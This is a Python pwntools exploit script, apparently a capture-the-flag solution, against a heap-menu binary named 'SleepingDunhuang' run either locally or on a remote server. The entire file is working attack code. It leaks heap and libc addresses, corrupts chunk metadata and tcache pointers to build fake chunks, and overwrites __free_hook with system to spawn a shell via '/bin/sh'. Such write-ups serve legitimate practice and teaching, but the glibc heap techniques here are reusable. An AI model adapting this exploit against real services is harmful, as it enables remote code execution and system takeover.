from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./SleepingDunhuang")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./SleepingDunhuang")
else:
    p = remote("152.136.18.34","10001")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./SleepingDunhuang")

def menu(choice):
    p.sendafter("4.show\n",str(choice))

def add(index,content):
    menu(1)
    p.sendafter("index:\n",str(index))
    p.recvuntil("gift: ")
    info = p.recvline().strip()
    p.sendafter("content:\n",content)
    return info

def free(index):
    menu(2)
    p.sendafter("index:\n",str(index))

def edit(index,content):
    menu(3)
    p.sendafter("index:\n",str(index))
    p.sendafter("content:\n",content)

def show(index):
    menu(4)
    p.sendafter("index:\n",str(index))

def debugf():
    if debug:
        gdb.attach(p,"b *0x4016C0")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
for i in range(0x10):
    info = add(i,"a")
    if i == 0:
        leak_addr = int(info,16)
        heap_base = leak_addr - 0x2a0
        log.success("heap_base:" + hex(heap_base))
size = 0x30*3
for i in range(10,3,-1):
    free(i+2)
    add(i+2,"\x00"*0x28 + chr(size + 1))
    free(i+3)
for i in range(0x10,0x15):
    add(i,"b")
#debugf()
free(0x10)
add(0x10,"\x00"*0x28 + chr(size + 1))
free(0x11)
for i in range(0x15,0x15 + 3):
    add(i,"b")
free(0x1)
free(0x17)
free(0x13)
target = 0x404060
payload = p64(heap_base + 0x260)
add(0x18,payload)
add(0x19,payload)
payload = p64(0) + p64(0x31) + p64(target - 0x18) + p64(target - 0x10)
add(0x1a,payload)
#debugf()
free(0x2)
free(0x16)
free(0x12)
payload = p64(heap_base + 0x290)
add(0x13,payload)
add(0x17,payload)
payload = p64(0x30) + p64(0x90)
add(0x1,payload)
#free(0)
free(0x15)
target = 0x404178
payload = p64(0) + p64(0x21) + p64(target - 0x18) + p64(target - 0x10) + p64(0x20) + chr(0x90)
add(0x1f,payload)
free(0x15 + 2)
free(0)
debugf()
payload = p64(elf.got["free"]) + p64(0x31)
payload += p64(target - 0x8) + p64(target - 0x18)
edit(0x1f,payload)
free(0x1e)
payload = p64(target - 0x18) * 2 + p64(0) + p32(1) + p32(2)
add(0x1e,payload)
show(0x1c)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["free"]
log.success("libc_base:" + hex(libc.address))
edit(0x1f,p64(libc.symbols["__free_hook"] - 0x8))
edit(0x1c,"/bin/sh\x00" + p64(libc.symbols["system"]))
free(0x1c)
p.interactive()
